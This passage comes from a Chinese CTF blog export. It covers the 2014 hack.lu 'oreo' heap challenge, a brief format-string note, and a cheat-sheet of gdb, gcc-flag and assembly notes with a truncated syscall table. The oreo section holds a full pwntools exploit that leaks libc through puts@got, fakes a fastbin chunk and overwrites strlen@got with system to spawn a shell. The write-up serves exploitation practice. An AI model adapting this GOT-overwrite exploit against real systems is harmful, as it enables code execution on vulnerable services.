id=\"echo\">echo<a class=\"post-anchor\" href=\"#echo\"></a></h3><p>​        两个题一起做（</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.35.57.png\" data-caption=\"截屏2022-03-19 下午5.35.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.35.57.png\" alt=\"截屏2022-03-19 下午5.35.57\"></a></p>\n<p>​        看起来非常像格式化字符串（</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.37.33.png\" data-caption=\"截屏2022-03-19 下午5.37.33\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.37.33.png\" alt=\"截屏2022-03-19 下午5.37.33\"></a></p>\n<h4 id=\"逆向-1\">逆向<a class=\"post-anchor\" href=\"#逆向-1\"></a></h4><p>​        没啥好逆的，纯纯格式化字符串。</p>\n<p>​        虽然但是，太久没有做过格式化字符串了，利用方式都给整忘了。</p>\n<p>​        </p>\n</body></html>","tags":["week"]},{"title":"2014 hack.lu oreo","url":"/2022/03/17/week3-3.2/","content":"<html><head></head><body><p>​    </p>\n<h4 id=\"overview\">overview<a class=\"post-anchor\" href=\"#overview\"></a></h4><p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png\" data-caption=\"截屏2022-03-17 下午3.11.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png\" alt=\"截屏2022-03-17 下午3.11.04\"></a></p>\n<p>​        搞不懂为什么这么多题都要stripped。</p>\n<h4 id=\"逆向\">逆向<a class=\"post-anchor\" href=\"#逆向\"></a></h4><h5 id=\"add\">add<a class=\"post-anchor\" href=\"#add\"></a></h5><h5 id=\"\"><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png\" data-caption=\"截屏2022-03-17 下午5.27.45\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png\" alt=\"截屏2022-03-17 下午5.27.45\"></a><a class=\"post-anchor\" href=\"#\"></a></h5><p>​        申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。</p>\n<p>​        输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。</p>\n<p>​        同时每输入信息以后都会有一个保存指针的操作：<br><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png\" data-caption=\"截屏2022-03-17 下午5.35.13\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png\" alt=\"截屏2022-03-17 下午5.35.13\"></a></p>\n<h5 id=\"free\">free<a class=\"post-anchor\" href=\"#free\"></a></h5><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png\" data-caption=\"截屏2022-03-17 下午5.33.13\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png\" alt=\"截屏2022-03-17 下午5.33.13\"></a></p>\n<p>​            虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png\" data-caption=\"截屏2022-03-17 下午5.51.06\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png\" alt=\"截屏2022-03-17 下午5.51.06\"></a></p>\n<p>​        可以看到bin中的fd。</p>\n<h5 id=\"show\">show<a class=\"post-anchor\" href=\"#show\"></a></h5><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png\" data-caption=\"截屏2022-03-18 下午2.06.39\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png\" alt=\"截屏2022-03-18 下午2.06.39\"></a></p>\n<p>​    </p>\n<p>​            打印descrption时会将fd指针所所指向的内容打印出来。</p>\n<h5 id=\"message-amp-show-status\">message&amp;show status<a class=\"post-anchor\" href=\"#message-amp-show-status\"></a></h5><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png\" data-caption=\"截屏2022-03-18 下午3.22.16\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png\" alt=\"截屏2022-03-18 下午3.22.16\"></a>            </p>\n<p>​        注意<code>fgets()</code>的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png\" data-caption=\"截屏2022-03-18 下午3.23.24\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png\" alt=\"截屏2022-03-18 下午3.23.24\"></a></p>\n<p>​        所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png\" data-caption=\"截屏2022-03-18 下午4.01.09\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png\" alt=\"截屏2022-03-18 下午4.01.09\"></a></p>\n<p>​        也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。</p>\n<h4 id=\"利用\">利用<a class=\"post-anchor\" href=\"#利用\"></a></h4><h6 id=\"把fd项填为puts-got的地址，从而泄露libc基址，计算system地址\">把fd项填为<code>puts@got</code>的地址，从而泄露libc基址，计算system地址<a class=\"post-anchor\" href=\"#把fd项填为puts-got的地址，从而泄露libc基址，计算system地址\"></a></h6><p>​    泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为<code>puts()</code>的got表地址，就能够泄露其地址。</p>\n<pre><code class=\"python\">add(25 * b'a', name)\nshow_rifle()\np.recvuntil('===================================\\n')\np.recvuntil('Description: ')\nputs_addr = u32(p.recvuntil('\\n', drop=True)[:4])\nprint(hex(puts_addr))\n</code></pre>\n<p>​        然后按套路算出<code>system()</code>的地址。</p>\n<pre><code class=\"python\">libcbase = puts_addr - libc.symbols('puts')\nsystem_addr = libcbase + libc.symbols('system')\nlog.success('system_addr ' + hex(system_addr))\n</code></pre>\n<h6 id=\"利用任意地址写覆盖free-got为system-addr\">利用任意地址写覆盖free@got为system_addr<a class=\"post-anchor\" href=\"#利用任意地址写覆盖free-got为system-addr\"></a></h6><p>​        刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。</p>\n<p>​        这里主要利用到了<code>order()</code>函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。</p>\n<p>​        最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png\" data-caption=\"截屏2022-03-18 下午3.45.11\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png\" alt=\"截屏2022-03-18 下午3.45.11\"></a></p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png\" data-caption=\"截屏2022-03-18 下午3.45.41\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png\" alt=\"截屏2022-03-18 下午3.45.41\"></a></p>\n<p>​        如果直接将fd填成<code>free_got_addr</code>，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》<code>main_arena =&gt; free_got_addr =&gt;chunk0</code>?怎么会有double free呢？</p>\n<p>​        </p>\n<p>​        先不管。</p>\n<p>​        回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。</p>\n<p>​        当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。</p>\n<p>​        为了覆盖got表，user space开始的地址需要是<code>0x804A2A</code>,所以这个chunk的size的地址在<code>0x804A2A4</code></p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png\" data-caption=\"截屏2022-03-18 下午5.24.13\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png\" alt=\"截屏2022-03-18 下午5.24.13\"></a></p>\n<p>​        可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。</p>\n<pre><code class=\"python\">from pwn import *\nfrom LibcSearcher import LibcSearcher\n\nlibc = ELF(\"/glibc/2.23/32/lib/libc-2.23.so\")\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\n'''\nif args['REMOTE']:\n    p = remote(\"node4.buuoj.cn\",27999)\nelse:\n    '''\np = process([\"/glibc/2.23/32/lib/ld-2.23.so\",\"./oreo\"],env={\"LD_PRELOAD\" : \"/glibc/2.23/32/lib/libc.so.6\"})\nelf = ELF('./oreo')\n\nstrlen_got_addr = elf.got['strlen']\nnotice_addr = 0x804A2A8\nfree_got_addr = 0x804A238 \n\ndef add(descrip, name):\n    p.sendline('1')\n    #p.recvuntil('Rifle name: ')\n    p.sendline(name)\n    #p.recvuntil('Rifle description: ')\n    #sleep(0.5)\n    p.sendline(descrip)\n\n\ndef show_rifle():\n    p.sendline('2')\n    p.recvuntil('===================================\\n')\n\n\ndef order():\n    p.sendline('3')\n\n\ndef message(notice):\n    p.sendline('4')\n    #p.recvuntil(\"Enter any notice you'd like to submit with your order: \")\n    p.sendline(notice)\n\n#find libc base\n\nname = 27 * b'a' + p32(elf.got['puts'])\nadd(25 * b'a', name)\nshow_rifle()\np.recvuntil('===================================\\n')\np.recvuntil('Description: ')\nputs_addr = u32(p.recvuntil('\\n', drop=True)[:4])\nlog.success('puts_addr ' + hex(puts_addr))\n\nlibcbase = puts_addr - libc.symbols['puts']\nsystem_addr = libcbase + libc.symbols['system']\nlog.success('system_addr ' + hex(system_addr))\n\n#overwrite free@got\nn = 1\nwhile n &lt; 0x3f:\n# set next link=NULL\n    add(25 * b'a', b'a' * 27 + p32(0))\n    n += 1\nadd(b'a'*25,b'b'*27+p32(notice_addr))\n\npayload = b'\\x00'*0x20  +p32(0x40) + p32(0x99)#\npayload = payload.ljust(52,b'a')\npayload += p32(0)\npayload = payload.ljust(128,b'c')\nmessage(payload)\norder()\n#p.recvuntil('Okay order submitted!\\n')\n\n\n#modify the strlen_got to system\n\npayload = p32(strlen_got_addr).ljust(20,b'a')\nadd(payload,b'a'*20)\ngdb.attach(p)\n\nmessage(p32(system_addr) + b';/bin/sh\\x00')\n\np.interactive()\n</code></pre>\n<p>​                </p>\n</body></html>","tags":["heap"]},{"title":"杂碎的指令","url":"/2021/04/24/%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/","content":"<html><head></head><body><hr>\n<hr>\n<hr>\n<p>[TOC]</p>\n<h2 id=\"杂碎的知识点\">杂碎的知识点<a class=\"post-anchor\" href=\"#杂碎的知识点\"></a></h2><h3 id=\"1）调试相关\">1）调试相关<a class=\"post-anchor\" href=\"#1）调试相关\"></a></h3><h5 id=\"1）gdb\">1）gdb<a class=\"post-anchor\" href=\"#1）gdb\"></a></h5><p>ropgagdet</p>\n<p>ROPgadget –binary （） –only “pop|ret” | grep rdi</p>\n<p>(基本适用于ret2csu这种万能gagdet的寻找)</p>\n<p>例如<code>ROPgadget --binary calc --only \"pop|ret\" | grep eax</code></p>\n<h5 id=\"2）内存断点？硬件断点？\">2）内存断点？硬件断点？<a class=\"post-anchor\" href=\"#2）内存断点？硬件断点？\"></a></h5><h6 id=\"原理\">原理<a class=\"post-anchor\" href=\"#原理\"></a></h6><p>对所访问内存地址设置为不可读写，当访问时触发中断。</p>\n<h6 id=\"设置方式\">设置方式<a class=\"post-anchor\" href=\"#设置方式\"></a></h6><p>参见pwndbg那张巨长的图。</p>\n<p><code>watch 0x123456</code></p>\n<p><code>watch a</code></p>\n<h5 id=\"加载调试符号\">加载调试符号<a class=\"post-anchor\" href=\"#加载调试符号\"></a></h5><p>​        对于没有stripped的程序，抽取制作调试符号：</p>\n<pre><code class=\"bash\">objcopy --only-keep-debug ELF_DEBUG xx.symbol\n</code></pre>\n<p>​        加载符号表</p>\n<pre><code class=\"bash\">gdb --symbol=xx.symbol -exec=ELF_RELEASE\n</code></pre>\n<p>或者直接利用有调试符号的elf作为符号表来源</p>\n<pre><code class=\"bash\">gdb --symbol=ELF -exec=ELF_RELEASE\n</code></pre>\n<p>直接为ELF文件添加符号表链接</p>\n<pre><code class=\"bash\">objcopy --add-gnu-debuglink=xx.symbol ELF_RELEASE\n</code></pre>\n<h3 id=\"2）汇编指令\">2）汇编指令<a class=\"post-anchor\" href=\"#2）汇编指令\"></a></h3><h4 id=\"跳转指令\">跳转指令<a class=\"post-anchor\" href=\"#跳转指令\"></a></h4><pre><code class=\"asm\">\nJE   ;等于则跳转\nJNE  ;不等于则跳转\n\nJZ   ;为 0 则跳转\nJNZ  ;不为 0 则跳转\n\nJS   ;为负则跳转\nJNS  ;不为负则跳转\n\nJC   ;进位则跳转\nJNC  ;不进位则跳转\n\nJO   ;溢出则跳转\nJNO  ;不溢出则跳转\n\nJA   ;无符号大于则跳转\nJNA  ;无符号不大于则跳转\nJAE  ;无符号大于等于则跳转\nJNAE ;无符号不大于等于则跳转\n\nJG   ;有符号大于则跳转\nJNG  ;有符号不大于则跳转\nJGE  ;有符号大于等于则跳转\nJNGE ;有符号不大于等于则跳转\n\nJB   ;无符号小于则跳转\nJNB  ;无符号不小于则跳转\nJBE  ;无符号小于等于则跳转\nJNBE ;无符号不小于等于则跳转\n\nps:\n；rax = 2\ncmp rax,1; =&gt;jump\n\nJL   ;有符号小于则跳转\nJNL  ;有符号不小于则跳转\nJLE  ;有符号小于等于则跳转\nJNLE ;有符号不小于等于则跳转\n\nJP   ;奇偶位置位则跳转\nJNP  ;奇偶位清除则跳转\nJPE  ;奇偶位相等则跳转\nJPO  ;奇偶位不等则跳转\n</code></pre>\n<h4 id=\"函数调用栈\">函数调用栈<a class=\"post-anchor\" href=\"#函数调用栈\"></a></h4><p>Leave等价于：</p>\n<pre><code class=\"asm\">        mov esp ebp\n        pop ebp\n</code></pre>\n<p> retn=pop eip（ret是回到函数调用前的下一条指令，ret指令等于将esp的贮存值（也就是栈·顶弹出）赋给eip，然后esp+4，由于esp中贮存的是函数调用前的下一条指令的地址，所以自然而然能够返回）</p>\n<p>但是为什么esp里面会贮存函数调用前的下一条指令的地址呢？</p>\n<p>这里要注意调用者函数和被调用者函数的栈桢是不同的。每一个发生一个函数调用就会产生一个新的栈帧。</p>\n<blockquote>\n<p>call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用RET（从过程返回）指令将处理器转回到该过程被调用的程序点上。从物理上来说，CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。</p>\n<p>​                                                                                                                         《cs：app》page：114</p>\n</blockquote>\n<p>（ps：csapp中的堆栈单纯指栈而不指堆）</p>\n<p>在这里当函数被调用，函数调用前的下一条指令的地址被作为esp的值被压栈了。也就是函数调用的第一句：push esp</p>\n<p>。函数被调——》</p>\n<p>被调用函数栈帧压入调用栈。</p>\n<p>建立新的栈帧，把被调函数的栈帧栈底地址放入bp中</p>\n<p>=〉push rbp</p>\n<p>​       mov rbp， rsp</p>\n<h3 id=\"3）编译指令\">3）编译指令<a class=\"post-anchor\" href=\"#3）编译指令\"></a></h3><h5 id=\"1）gcc编译\">1）gcc编译<a class=\"post-anchor\" href=\"#1）gcc编译\"></a></h5><p>普通的编译（默认保护全开）】<code>gcc test.c -o test</code></p>\n<p>禁用PIE <code>gcc -z -no-pie test.c -o test</code></p>\n<p>禁用RELRO <code>gcc -z norelro x x x.c -o xxx</code></p>\n<p>禁用Canary <code>-fno-stack-protector</code></p>\n<p>禁用NX <code>gcc -z execstack -o test test.c    </code></p>\n<p>所以保护全关的命令：</p>\n<pre><code class=\"bash\">gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o test\n</code></pre>\n<h3 id=\"4）linux系统调用号\">4）linux系统调用号<a class=\"post-anchor\" href=\"#4）linux系统调用号\"></a></h3><h5 id=\"1）32bit\">1）32bit<a class=\"post-anchor\" href=\"#1）32bit\"></a></h5><pre><code class=\"c\">#ifndef _ASM_X86_UNISTD_32_H\n#define _ASM_X86_UNISTD_32_H 1\n\n#define __NR_restart_syscall 0\n#define __NR_exit 1\n#define __NR_fork 2\n#define __NR_read 3\n#define __NR_write 4\n#define __NR_open 5\n#define __NR_close 6\n#define __NR_waitpid 7\n#define __NR_creat 8\n#define __NR_link 9\n#define __NR_unlink 10\n#define __NR_execve 11\n#define __NR_chdir 12\n#define __NR_time 13\n#define __NR_mknod 14\n#define __NR_chmod 15\n#define __NR_lchown 16\n#define __NR_break 17\n#define __NR_oldstat 18\n#define __NR_lseek 19\n#define __NR_getpid 20\n#define __NR_mount 21\n#define __NR_umount 22\n#define __NR_setuid 23\n#define __NR_getuid 24\n#define __NR_stime 25\n#define __NR_ptrace 26\n#define __NR_alarm 27\n#define __NR_oldfstat 28\n#define __NR_pause 29\n#define __NR_utime 30\n#define __NR_stty 31\n#define __NR_gtty 32\n#define __NR_access 33\n#define __NR_nice 34\n#define __NR_ftime 35\n#define __NR_sync 36\n#define __NR_kill 37\n#define __NR_rename 38\n#define __NR_mkdir 39\n#define __NR_rmdir 40\n#define __NR_dup 41\n#define __NR_pipe 42\n#define __NR_times 43\n#define __NR_prof 44\n#define __NR_brk 45\n#define __NR_setgid 46\n#define __NR_getgid 47\n#define __NR_signal 48\n#define __NR_geteuid 49\n#define __NR_getegid 50\n#define __NR_acct 51\n#define __NR_umount2 52\n#define __NR_lock 53\n#define __NR_ioctl 54\n#define __NR_fcntl 55\n#define __NR_mpx 56\n#define __NR_setpgid 57\n#define __NR_ulimit 58\n#define __NR_oldolduname 59\n#define __NR_umask 60\n#define __NR_chroot 61\n#define __NR_ustat 62\n#define __NR_dup2 63\n#define __NR_getppid 64\n#define __NR_getpgrp 65\n#define __NR_setsid 66\n#define __NR_sigaction 67\n#define __NR_sgetmask 68\n#define __NR_ssetmask 69\n#define __NR_setreuid 70\n#define __NR_setregid 71\n#define __NR_sigsuspend 72\n#define __NR_sigpending 73\n#define __NR_sethostname 74\n#define __NR_setrlimit 75\n#define __NR_getrlimit 76\n#define __NR_getrusage 77\n#define __NR_gettimeofday 78\n#define __NR_settimeofday 79\n#define __NR_getgroups 80\n#define __NR_setgroups 81\n#define __NR_select 82\n#define __NR_symlink 83\n#define __NR_oldlstat 84\n#define __NR_readlink 85\n#define __NR_uselib 86\n#define __NR_swapon 87\n#define __NR_reboot 88\n#define __NR_readdir 89\n#define __NR_mmap 90\n#define __NR_munmap 91\n#define __NR_truncate 92\n#define __NR_ftruncate 93\n#define __NR_fchmod 94\n#define __NR_fchown 95\n#define __NR_getpriority 96\n#define __NR_setpriority 97\n#define __NR_profil 98\n#define __NR_statfs 99\n#define __NR_fstatfs 100\n#define __NR_ioperm 101\n#define __NR_socketcall 102\n#define __NR_syslog 103\n#define __NR_setitimer 104\n#define __NR_getitimer 105\n#define __NR_stat 106\n#define __NR_lstat 107\n#define __NR_fstat 108\n#define __NR_olduname 109\n#define __NR_iopl 110\n#define __NR_vhangup 111\n#define __NR_idle 112\n#define __NR_vm86old 113\n#define __NR_wait4 114\n#define __NR_swapoff 115\n#define __NR_sysinfo 116\n#define __NR_ipc 117\n#define __NR_fsync 118\n#define __NR_sigreturn 119\n#define __NR_clone 120\n#define __NR_setdomainname 121\n#define __NR_uname 122\n#define __NR_modify_ldt 123\n#define __NR_adjtimex 124\n#define __NR_mprotect 125\n#define __NR_sigprocmask 126\n#define __NR_create_module 127\n#define __NR_init_module 128\n#define __NR_delete_module 129\n#define __NR_get_kernel_syms 130\n#define __NR_quotactl 131\n#define __NR_getpgid 132\n#define __NR_fchdir 133\n#define __NR_bdflush 134\n#define __NR_sysfs 135\n#define __NR_personality 136\n#define __NR_afs_syscall 137\n#define __NR_setfsuid 138\n#define __NR_setfsgid 139\n#define __NR__llseek 140\n#define __NR_getdents 141\n#define __NR__newselect 142\n#define __NR_flock 143\n#define __NR_msync 144\n#define __NR_readv 145\n#define __NR_writev 146\n#define __NR_getsid 147\n#define __NR_fdatasync 148\n#define __NR__sysctl 149\n#define __NR_mlock 150\n#define __NR_munlock 151\n#define __NR_mlockall 152\n#define __NR_munlockall 153\n#define __NR_sched_setparam 154\n#define __NR_sched_getparam 155\n#define __NR_sched_setscheduler 156\n#define __NR_sched_getscheduler 157\n#define __NR_sched_yield 158\n#define __NR_sched_get_priority_max 159\n#define __NR_sched_get_priority_min 160\n#define __NR_sched_rr_get_interval 161\n#define __NR_nanosleep 162\n#define __NR_mremap 163\n#define __NR_setresuid 164\n#define __NR_getresuid 165\n#define __NR_vm86 166\n#define __NR_query_module 167\n#define __NR_poll 168\n#define __NR_nfsservctl 169\n#define __NR_setresgid 170\n#define __NR_getresgid 171\n#define __NR_prctl 172\n#define __NR_rt_sigreturn 173\n#define __NR_rt_sigaction 174\n#define __NR_rt_sigprocmask 175\n#define __NR_rt_sigpending 176\n#define __NR_rt_sigtimedwait 177\n#define __NR_rt_sigqueueinfo 178\n#define __NR_rt_sigsuspend 179\n#define __NR_pread64 180\n#define __NR_pwrite64 181\n#define __NR_chown 182\n#define __NR_getcwd 183\n#define __NR_capget 184\n#define __NR_capset 185\n#define __NR_sigaltstack 186\n#define __NR_sendfile 187\n#define __NR_getpmsg 188\n#define __NR_putpmsg 189\n#define __NR_vfork 190\n#define __NR_ugetrlimit 191\n#define __NR_mmap2 192\n#define __NR_truncate64 193\n#define __NR_ftruncate64 194\n#define __NR_stat64 195\n#define __NR_lstat64 196\n#define __NR_fstat64 197\n#define __NR_lchown32 198\n#define __NR_getuid32 199\n#define __NR_getgid32 200\n#define __NR_geteuid32 201\n#define __NR_getegid32 202\n#define __NR_setreuid32 203\n#define __NR_setregid32 204\n#define __NR_getgroups32 205\n#define __NR_setgroups32 206\n#define __NR_fchown32 207\n#define __NR_setresuid32 208\n#define __NR_getresuid32 209\n#define __NR_setresgid32 210\n#define __NR_getresgid32 211\n#define __NR_chown32 212\n#define __NR_setuid32 213\n#define __NR_setgid32 214\n#define __NR_setfsuid32 215\n#define __NR_setfsgid32 216\n#define __NR_pivot_root 217\n#define __NR_mincore 218\n#define __NR_madvise 219\n#define __NR_getdents64 220\n#define __NR_fcntl64 221\n#define __NR_gettid 224\n#define __NR_readahead 225\n#define __NR_setxattr 226\n#define __NR_lsetxattr 227\n#define __NR_fsetxattr 228\n#define __NR_getxattr 229\n#define __NR_lgetxattr 230\n#define __NR_fgetxattr 231\n#define __NR_listxattr 232\n#define __NR_llistxattr 233\n#define __NR_flistxattr 234\n#define __NR_removexattr 235\n#define __NR_lremovexattr 236\n#define __NR_fremovexattr 237\n#define __NR_tkill 238\n#define __NR_sendfile64 239\n#define __NR_futex 240\n#define __NR_sched_setaffinity 241\n#define __NR_sched_getaffinity 242\n#define __NR_set_thread_area 243\n#define __NR_get_thread_area 244\n#define __NR_io_setup 245\n#define __NR_io_destroy 246\n#define __NR_io_getevents 247\n#define __NR_io_submit 248\n#define __NR_io_cancel 249\n#define __NR_fadvise64 250\n#define __NR_exit_group 252\n#define __NR_lookup_dcookie 253\n#define __NR_epoll_create 254\n#define __NR_epoll_ctl 255\n#define __NR_epoll_wait 256\n#define __NR_remap_file_pages 257\n#define __NR_set_tid_address 258\n#define __NR_timer_create 259\n#define __NR_timer_settime 260\n#define __NR_timer_gettime 261\n#define __NR_timer_getoverrun 262\n#define __NR_timer_delete 263\n#define __NR_clock_settime 264\n#define __NR_clock_gettime 265\n#define __NR_clock_getres 266\n#define __NR_clock_nanosleep 267\n#define __NR_statfs64 268\n#define __NR_fstatfs64 269\n#define __NR_tgkill 270\n#define __NR_utimes 271\n#define __NR_fadvise64_64 272\n#define __NR_vserver 273\n#define __NR_mbind 274\n#define __NR_get_mempolicy 275\n#define __NR_set_mempolicy 276\n#define __NR_mq_open 277\n#define __NR_mq_unlink 278\n#define __NR_mq_timedsend 279\n#define __NR_mq_timedreceive 280\n#define __NR_mq_notify 281\n#define __NR_mq_getsetattr 282\n#define __NR_kexec_load 283\n#define __NR_waitid 284\n#define __NR_add_key 286\n#define __NR_request_key 287\n#define __NR_keyctl 288\n#define __NR_ioprio_set 289\n#define __NR_ioprio_get 290\n#define __NR_inotify_init 291\n#define __NR_inotify_add_watch 292\n#define __NR_inotify_rm_watch 293\n#define __NR_migrate_pages 294\n#define __NR_openat 295\n#define __NR_mkdirat 296\n#define __NR_mknodat 297\n#define __NR_fchownat 298\n#define __NR_futimesat 299\n#define __NR_fstatat64 300\n#define __NR_unlinkat 301\n#define __NR_renameat 302\n#define __NR_linkat 303\n#define __NR_symlinkat 304\n#define __NR_readlinkat 305\n#define __NR_fchmodat 306\n#define __NR_faccessat 307\n#define __NR_pselect6 308\n#define __NR_ppoll 309\n#define __NR_unshare 310\n#define __NR_set_robust_list 311\n#define __NR_get_robust_list 312\n#define __NR_splice 313\n#define __NR_sync_file_range 314\n#define __NR_tee 315\n#define __NR_vmsplice 316\n#define __NR_move_pages 317\n#define __NR_getcpu 318\n#define __NR_epoll_pwait 319\n#define __NR_utimensat 320\n#define __NR_signalfd 321\n#define __NR_timerfd_create 322\n#define __NR_eventfd 323\n#define __NR_fallocate 324\n#define __NR_timerfd_settime 325\n#define __NR_timerfd_gettime 326\n#define __NR_signalfd4 327\n#define __NR_eventfd2 328\n#define __NR_epoll_create1 329\n#define __NR_dup3 330\n#define __NR_pipe2 331\n#define __NR_inotify_init1 332\n#define __NR_preadv 333\n#define __NR_pwritev 334\n#define __NR_rt_tgsigqueueinfo 335\n#define __NR_perf_event_open 336\n#define __NR_recvmmsg 337\n#define __NR_fanotify_init 338\n#define __NR_fanotify_mark 339\n#define __NR_prlimit64 340\n#define __NR_name_to_handle_at 341\n#define __NR_open_by_handle_at 342\n#define __NR_clock_adjtime 343\n#define __NR_syncfs 344\n#define __NR_sendmmsg 345\n#define __NR_setns 346\n#define __NR_process_vm_readv 347\n#define __NR_process_vm_writev 348\n#define __NR_kcmp 349\n#define __NR_finit_module 350\n#define __NR_sched_setattr 351\n#define __NR_sched_getattr 352\n#define __NR_renameat2 353\n#define __NR_seccomp 354\n#define __NR_getrandom 355\n#define __NR_memfd_create 356\n#define __NR_bpf 357\n#define __NR_execveat 358\n#define __NR_socket 359\n#define __NR_socketpair 360\n#define __NR_bind 361\n#define __NR_connect 362\n#define __NR_listen 363\n#define __NR_accept4 364\n#define __NR_getsockopt 365\n#define __NR_setsockopt 